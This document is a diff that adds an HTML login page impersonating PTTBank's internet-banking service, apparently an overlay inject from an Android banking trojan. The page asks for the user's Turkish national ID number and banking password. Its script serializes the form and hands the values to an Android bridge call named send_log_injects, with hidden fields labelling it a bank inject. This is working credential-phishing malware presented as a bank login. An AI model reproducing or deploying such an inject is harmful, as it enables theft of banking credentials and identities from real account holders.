@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"> 
+	<meta name="viewport" content="width=device-width,height=device-height, initial-scale=1.0, user-scalable=yes, maximum-scale=1.0">
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+	<script src="https://use.fontawesome.com/8d8c3a1b01.js"></script>
+
+</head>
+<body>
+	<style>
+	body {
+	background: #e2e2e2;
+}
+.header {
+	background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAA6CAIAAAA/Te4cAAAAGG5wT2wAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAADYHRhkAAAAOG5wVGMAAgICIAAAACgAAAAAAAAAAAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAUAAAAAAAAADkAAAAB/wEyTzQEwaAAAABjSURBVEjH7ZfRCQAgCEQNov23qT2aoTXu2sGgQ7T/h5faaW3MY97TjZTBFlO2DAb8MIWynyIjX2SomkR3ZwKVsH+yhbDMAFGlCuOeCW2IQZ9kDfd/qxSpG3QJ9+2nD8pebvgCKrV2aB7mgjYAAAAASUVORK5CYII=);
+	height: 58px;
+	text-align: center;
+}
+.header2 {
+    background: #28abea;
+    margin: 0 auto;
+    margin-top: 15px;
+    text-align: center;
+    font-size: 24px;
+    color: #fff;
+    padding: 2px;
+    border: 0;
+    border-radius: 5px 5px 0 0;
+    width: 90%;
+    font-weight: bold;
+}
+hr {
+    background: #249ad3;
+    color: #249ad3;
+    width: 90%;
+    height: 1px;
+    margin: 0 auto;
+    border: 0;
+}
+form {
+    width: 90%;
+    margin: 0 auto;
+    text-align: center;
+    background: #3abcfa;
+    border-radius: 0 0 5px 5px;
+    display: flow-root;
+}
+.input {
+    width: 98%;
+    margin: 0 auto;
+    font-size: 24px;
+    display: block;
+    margin-top: 10px;
+    border-top: 1px solid #708189;
+    border-left: 1px solid #9fa8ad;
+    border-bottom: 1px solid #f1f1f1;
+    border-right: 1px solid #9fa8ad;
+    padding: 5px 11px;
+    border-radius: 3px;
+    box-shadow: inset 0 1px 6px -2px black;
+}
+
+.button-div {
+    background: #01202d;
+    border-radius: 0 0 5px 5px;
+}
+
+.submit-button {
+    background: #e7e7e7;
+    border: 0;
+    margin: 10px 0;
+    width: 90%;
+    font-size: 24px;
+    color: #005980;
+    font-weight: bold;
+    border-radius: 3px;
+}
+.error {
+	border-color: #f00 !important;
+	margin-bottom: 0 !important;
+}
+	</style>
+<div class="header">
+	<img style="width: 57px;margin-left: 0px;" src="data:image/png;base64,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">
+</div>
+
+<div id="content">
+	<div class="header2">
+		PTTBank
+	</div>
+	
+	<hr></hr>
+	<hr style="background: #61c9fb;"></hr>
+	
+	<form id="form">
+	<input type="text" class="input" name="fields[login]" id="login" placeholder="TC Kimlik No" style="margin-top: 10px;" maxlength="11">
+	<input type="password" class="input" name="fields[password]" id="password" placeholder="İnternet Bankacılığı Şifresi" maxlength="8">
+	<br><br><br>
+	<br><br><br>
+	<br><br><br>
+	<div class="button-div">
+		<button type="button" class="submit-button" onclick="next()" id="submitBtn1"><span>GİRİŞ</span></button>
+		<input id="type_injects" value='banks' type="hidden" required>
+		<input id="closed" value='close_activity_injects' type="hidden" required>
+	</div>
+	
+</form>
+    <script type="text/javascript">
+
+function next(){
+					
+						var oNumInp = document.getElementById('login');
+                        var oCodeInp = document.getElementById('password');
+
+						try{
+							oNumInp.className = oCodeInp.className = 'input';
+						} catch(e){};
+						
+                        if (oNumInp.value.length < 6) {
+							try{
+								oNumInp.className = 'input error';
+							} catch(e){};
+                            return false;
+                        }
+						
+                        if (oCodeInp.value.length < 8) {
+							try{
+                                oCodeInp.className = 'input error';
+							} catch(e){};
+                            return false;
+                        }
+                        process('form');
+							}
+							function process(formId) {
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        
+        try {
+        Android.send_log_injects(formToJSON(document.getElementById(formId)));
+        } catch (err) {}
+    }else{
+        alert(formToJSON(document.getElementById(formId)));
+    }
+}
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSON(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+
+    for(var i = 0; i < namesHTML.length; i++) {
+      
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+       
+        for(var j = 0; j < bsform.length; j++) {
+            FinalObject[bsform[j].id] = bsform[j].value;
+            
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+</script>
+</div>
+</body>
+</html>
